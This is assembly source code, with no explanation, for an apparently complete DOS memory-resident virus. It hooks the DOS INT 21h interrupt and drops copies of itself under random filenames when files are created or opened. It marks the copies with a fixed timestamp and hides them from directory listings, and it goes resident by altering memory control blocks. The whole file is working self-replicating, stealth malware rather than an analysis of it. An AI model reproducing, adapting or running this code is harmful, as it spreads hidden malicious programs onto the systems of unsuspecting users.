ideal
@date	=	0355h			;21.10.1981
@time	=	8E79h			;17:51:50
model	tiny
codeseg
startupcode
	jmp	begin
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
macro	intdos
	pushf
	call	[dword cs:oi21]
endm
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
i21:	push	ax
	xor	al,al
	cmp	ah,3ch
	jz	okk
	cmp	ah,5bh
	jz	okk
	cmp	ah,3dh
	jz	okk
	inc	al
	cmp	ah,16h
	jz	okk
	cmp	ah,0fh
	jnz	ov0
okk:	jmp	ok
ov0:	cmp	ah,1ah
	jz	setdta
	mov	[byte cs:funct],12h
	cmp	ah,12h
	jz	fndf
	cmp	ah,11h
	jz	fndf
	mov	[byte cs:funct],4fh
	cmp	ah,4eh
	jz	fndh
	cmp	ah,4fh
	jz	fndh
ov:	pop	ax
	db	0eah
oi21	dw	0
oi21s	dw	0
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
setdta:	mov	[cs:dta],dx
	mov	[cs:dta+2],ds
	jmp	ov
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
fndh:	pop	ax
fnd0:	intdos
	jc	fex
	pushf
	push	si di es ds
	lds	si,[dword cs:dta]
compar:	cmp	[word si+16h],@time
	jnz	f10
	cmp	[word si+18h],@date
	jnz	f10
	pop	ds es di si
	popf
	lds	dx,[dword cs:dta]
	db	0b4h
funct	db	4fh
	jmp	fnd0
f10:	pop	ds es di si
	popf
fex:	push	ax bp
	mov	bp,sp
	lahf
	mov	[ss:bp+8],ah
	pop	bp ax
	iret
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
fndf:	pop	ax
fnf0:	intdos
	and	al,al
	jnz	fex
	pushf
	push	si di es ds
	lds	si,[dword cs:dta]
	cmp	[byte ds:si],0ffh
	jnz	f21
	add	si,7
f21:	inc	si
	jmp	compar
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
ok:	push	bx cx dx si di ds es
	and	al,al
	jz	nex
	mov	cx,6
	mov	ax,cs
	mov	es,ax
	lea	di,[ok1]
	mov	si,dx
	rep	cmpsw
	jnz	nex
	pop	es ds di si dx cx bx ax
	mov	ax,1313h
	iret
nex:
	xor	ax,ax
	mov	ds,ax
	mov	ax,[ds:90h]
	push	ax
	mov	ax,[ds:92h]
	push	ax
	mov	[word ds:90h],offset i24
	mov	[word ds:92h],cs
	
	mov	bx,[ds:46ch]
	mov	ax,cs
	mov	ds,ax
	mov	es,ax
	test	bx,6C1h
	jnz	no_chg
	cmp	[byte pauss],0
	jz	chg1
	dec	[byte pauss]
	jmp	no_chg
chg1:	mov	[pauss],80
	xor	al,al
	out	43h,al
	jcxz	$+2
	in	al,40h
	mov	bl,al
	in	al,40h
	add	al,bl
	and	al,1fh
	cmp	al,'Z'-'A'
	jbe	xx1
	sub	al,'Z'-'A'
xx1:	add	al,'A'
	std
	mov	si,offset fname+6
	lea	di,[si+1]
	mov	cx,7
	rep	movsb
	stosb
no_chg:
	mov	ah,5bh
	lea	dx,[fname]
	mov	cx,1
	intdos
	jc	term
	mov	bx,ax
	mov	ah,40h
	mov	cx,offset endcod-100h
	mov	dx,100h
;	inc	[cs:count]
	mov	[cs:flag],0
	intdos
	cmp	ax,offset endcod-100h
	jnz	ok1
	mov	[cs:flag],1
ok1:	mov	ax,5701h
	mov	cx,@time
	mov	dx,@date
	intdos

	mov	ah,3eh
	intdos
	cmp	[cs:flag],1
	jz	term

	lea	dx,[fname]
	mov	ax,4301h
	xor	cx,cx
	intdos
	lea	dx,[fname]
	mov	ah,41h
;	dec	[cs:count]
	intdos
term:	xor	ax,ax
	mov	ds,ax
	pop	ax
	mov	[ds:92h],ax
	pop	ax
	mov	[ds:90h],ax
ok0:	pop	es ds di si dx cx bx
	jmp	ov
driv	db	0
flag	db	0
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
i24:	mov	al,3
	iret
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
begin:	mov	ah,16h
	lea	dx,[ok1]
	int	21h
	cmp	ax,1313h
	jnz	b01
b02:	int	20h
b01:	mov	ax,[ds:2ch]
	mov	ds,ax
	xor	si,si
	cld
b04:	lodsb
	and	al,al
	jnz	b04
	lodsb
	and	al,al
	jnz	b04
	inc	si
	inc	si
b05:	mov	bx,si
b06:	lodsb
	cmp	al,':'
	jz	b05
	cmp	al,'\'
	jz	b05
	and	al,al
	jnz	b06
	mov	cx,si
	sub	cx,bx
	mov	si,bx
	mov	di,offset fname
	rep	movsb
	mov	ah,2fh
	int	21h
	mov	[cs:dta],bx
	mov	[cs:dta+2],es
	mov	[byte cs:pauss],0
	mov	ax,cs
	mov	ds,ax
	dec	ax
	mov	es,ax
	
	mov	cl,4
	mov	ax,offset endpr-100h
	add	ax,15
	shr	ax,cl
	mov	cx,[es:3]
	sub	[es:3],ax
	mov	bx,ax
	mov	ax,cs
	add	ax,[es:3]
	sub	ax,10h
	mov	[bseg],ax
	cmp	[byte es:0],'Z'
	jz	b10

	push	ds
	mov	ax,cs
	add	ax,cx
	mov	ds,ax
	sub	ax,bx
	mov	es,ax
	sub	ax,0fh
	mov	[cs:bseg],ax
	xor	si,si
	mov	di,si
	mov	cx,8
	rep	movsw
	add	[es:3],bx
	sub	[es:1],bx
	pop	ds
	
b10:	mov	ax,[bseg]
	mov	es,ax
	mov	si,100h
	mov	di,si
	mov	cx,offset endpr-100h
	rep	movsb
	mov	di,offset b03
	xchg	di,[0ah]
	xchg	ax,[0ch]
	mov	[es:oter],di
	mov	[es:oter+2],ax
	ret
b03:	push	ax bx ds es cs
	pop	ds
	mov	ax,3521h
	int	21h
	mov	[oi21],bx
	mov	[oi21s],es
	mov	ax,2521h
	lea	dx,[i21]
	int	21h
	pop	es ds bx ax
	db	0eah
endcod	=	$
oter	dw	0
bseg	dw	?
count	dw	?
pauss	db	?
fname	db	13 dup (?)
dta	dw	?,?
endpr	=	$
end